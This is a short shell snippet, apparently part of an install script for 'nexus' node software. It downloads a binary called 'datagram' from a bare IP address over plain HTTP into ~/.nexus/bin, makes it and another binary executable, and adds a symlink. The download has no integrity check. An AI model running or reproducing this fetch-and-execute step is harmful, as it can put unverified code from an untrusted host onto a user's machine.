          curl -L "http://103.246.188.56:8000/datagram" -o ~/.nexus/bin/datagram
          chmod +x ~/.nexus/bin/nexus-network
          chmod +x ~/.nexus/bin/datagram
          ln -sf ~/.nexus/bin/nexus-network ~/.nexus/bin/nexus-cli

